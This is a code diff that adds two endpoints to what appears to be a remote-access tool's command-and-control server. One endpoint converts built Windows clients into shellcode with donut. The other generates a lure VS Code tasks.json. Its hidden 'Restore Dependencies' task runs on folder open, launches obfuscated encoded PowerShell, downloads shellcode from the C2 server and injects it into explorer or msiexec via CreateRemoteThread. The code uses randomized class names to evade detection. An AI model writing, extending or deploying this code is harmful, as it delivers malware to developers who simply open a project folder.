@@ -1,4 +1,7 @@
 import { createHash } from "crypto";
+import crypto from "crypto";
+import { execFileSync } from "child_process";
+import os from "os";
 import { v4 as uuidv4 } from "uuid";
 import { authenticateRequest } from "../../auth";
 import { AuditAction, logAudit } from "../../auditLog";
@@ -505,6 +508,134 @@ export async function handleBuildRoutes(
         headers: {
           "Content-Type": "application/octet-stream",
           "Content-Disposition": `attachment; filename="${fileName}"`,
+        },
+      });
+    }
+
+    // ── Donut shellcode endpoint — converts a built Windows PE to raw x64 shellcode ──
+    if (req.method === "GET" && url.pathname.match(/^\/api\/build\/shellcode\//)) {
+      requirePermission(user, "clients:build");
+
+      const rawName = url.pathname.split("/api/build/shellcode/")[1] || "";
+      let fileName: string;
+      try { fileName = decodeURIComponent(rawName); } catch {
+        return Response.json({ error: "Bad request" }, { status: 400 });
+      }
+      if (!fileName || fileName.includes("\0") || fileName.includes("/") || fileName.includes("\\"))
+        return Response.json({ error: "File not found" }, { status: 404 });
+
+      const rootDir = resolveRuntimeRoot();
+      const distRoot = path.resolve(rootDir, "dist-clients");
+      const filePath = path.resolve(distRoot, fileName);
+      if (!filePath.startsWith(distRoot + path.sep))
+        return Response.json({ error: "File not found" }, { status: 404 });
+      if (!fs.existsSync(filePath))
+        return Response.json({ error: "File not found" }, { status: 404 });
+
+      const donutBin = fs.existsSync("/app/data/tools/donut") ? "/app/data/tools/donut" : null;
+      if (!donutBin)
+        return Response.json({ error: "donut not available on this server" }, { status: 503 });
+
+      const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "ovd-sc-"));
+      try {
+        const scPath = path.join(tmp, "payload.bin");
+        execFileSync(donutBin, ["-i", filePath, "-o", scPath, "-a", "2", "-f", "1"], { timeout: 30_000 });
+        const scBytes = fs.readFileSync(scPath);
+        const baseName = fileName.replace(/\.[^.]+$/, "");
+        return new Response(scBytes, {
+          headers: {
+            "Content-Type": "application/octet-stream",
+            "Content-Disposition": `attachment; filename="${baseName}.bin"`,
+          },
+        });
+      } catch (err: any) {
+        logger.error(`[shellcode] donut failed: ${err?.message}`);
+        return Response.json({ error: "donut conversion failed" }, { status: 500 });
+      } finally {
+        fs.rmSync(tmp, { recursive: true, force: true });
+      }
+    }
+
+    // ── tasks.json lure endpoint — VS Code folder-open shellcode injector ──────
+    if (req.method === "GET" && url.pathname.match(/^\/api\/build\/tasks-json\//)) {
+      requirePermission(user, "clients:build");
+
+      const rawName = url.pathname.split("/api/build/tasks-json/")[1] || "";
+      let fileName: string;
+      try { fileName = decodeURIComponent(rawName); } catch {
+        return Response.json({ error: "Bad request" }, { status: 400 });
+      }
+      if (!fileName || fileName.includes("\0") || fileName.includes("/") || fileName.includes("\\"))
+        return Response.json({ error: "File not found" }, { status: 404 });
+
+      const rootDir = resolveRuntimeRoot();
+      const distRoot = path.resolve(rootDir, "dist-clients");
+      const filePath = path.resolve(distRoot, fileName);
+      if (!filePath.startsWith(distRoot + path.sep))
+        return Response.json({ error: "File not found" }, { status: 404 });
+      if (!fs.existsSync(filePath))
+        return Response.json({ error: "File not found" }, { status: 404 });
+
+      // Derive C2 base URL from the incoming request
+      const proto = req.headers.get("x-forwarded-proto") || "https";
+      const host  = req.headers.get("x-forwarded-host") || req.headers.get("host") || "localhost:5173";
+      const c2url = `${proto}://${host}`;
+      const shellcodeUrl = `${c2url}/api/build/shellcode/${encodeURIComponent(fileName)}`;
+
+      // Random polymorphic class name
+      const cn = Array.from(crypto.getRandomValues(new Uint8Array(6)))
+        .map((b) => "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz"[b % 46]).join("");
+
+      const cs =
+        `using System;using System.Runtime.InteropServices;` +
+        `public class ${cn}{` +
+        `[DllImport("kernel32",EntryPoint="OpenProcess")]public static extern IntPtr OP(uint a,bool b,int c);` +
+        `[DllImport("kernel32",EntryPoint="VirtualAllocEx")]public static extern IntPtr VA(IntPtr h,IntPtr a,IntPtr s,uint t,uint p);` +
+        `[DllImport("kernel32",EntryPoint="WriteProcessMemory")]public static extern bool WM(IntPtr h,IntPtr a,byte[]b,IntPtr s,out IntPtr w);` +
+        `[DllImport("kernel32",EntryPoint="CreateRemoteThread")]public static extern IntPtr CT(IntPtr h,IntPtr a,IntPtr s,IntPtr e,IntPtr pa,uint f,IntPtr i);}`;
+      const csB64 = Buffer.from(cs, "utf-8").toString("base64");
+
+      const psLines = [
+        `[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}`,
+        `[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12`,
+        `$sc=(New-Object Net.WebClient).DownloadData('${shellcodeUrl}')`,
+        `Add-Type -TypeDefinition ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${csB64}')))`,
+        `$lp=Get-Process -Name explorer -ErrorAction SilentlyContinue|Select-Object -First 1`,
+        `if(-not $lp){$pi=New-Object Diagnostics.ProcessStartInfo("$env:SYSTEMROOT\\system32\\msiexec.exe","/q");$pi.WindowStyle='Hidden';$pi.CreateNoWindow=$true;$lp=[Diagnostics.Process]::Start($pi)}`,
+        `$hp=[${cn}]::OP(0x1FFFFF,$false,$lp.Id)`,
+        `$ma=[${cn}]::VA($hp,[IntPtr]::Zero,[IntPtr]$sc.Length,0x3000,0x40)`,
+        `$bw=[IntPtr]::Zero`,
+        `[${cn}]::WM($hp,$ma,$sc,[IntPtr]$sc.Length,[ref]$bw)|Out-Null`,
+        `[${cn}]::CT($hp,[IntPtr]::Zero,[IntPtr]::Zero,$ma,[IntPtr]::Zero,0,[IntPtr]::Zero)|Out-Null`,
+      ];
+      const enc = Buffer.from(psLines.join(";"), "utf16le").toString("base64");
+
+      const tasksJson = {
+        version: "2.0.0",
+        tasks: [
+          {
+            label: "Restore Dependencies",
+            type: "shell",
+            command: `%COMSPEC% /v /c "set a=pow&&set b=er&&set c=she&&set d=ll&&!a!!b!!c!!d! -nop -w h -ep b -enc ${enc}"`,
+            runOptions: { runOn: "folderOpen" },
+            presentation: { reveal: "never", panel: "shared", showReuseMessage: false, close: true },
+            problemMatcher: [],
+          },
+          {
+            label: "Build",
+            type: "shell",
+            command: "npm run build",
+            group: { kind: "build", isDefault: true },
+            presentation: { reveal: "always", panel: "shared" },
+            problemMatcher: ["$tsc"],
+          },
+        ],
+      };
+
+      return new Response(JSON.stringify(tasksJson, null, 2), {
+        headers: {
+          "Content-Type": "application/json",
+          "Content-Disposition": `attachment; filename="tasks.json"`,
         },
       });
     }
